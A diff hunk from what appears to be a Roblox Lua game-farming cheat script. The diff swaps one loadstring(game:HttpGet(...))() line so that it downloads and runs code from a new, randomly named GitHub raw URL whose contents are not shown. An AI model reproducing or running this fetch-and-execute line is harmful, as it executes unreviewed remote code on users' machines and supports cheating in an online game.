@@ -3556,7 +3556,7 @@ function CheckOldQuest(LevelFarm)
         end
     end
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AAwful/testyuuuu/main/README.md"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SSDAWGDFHTEHVFFSGXCVBSDFBFDGWGSDVDDSXC/d/main/qweee"))()
 local PepsisWorld = library:Evil()
 
 --หลัก
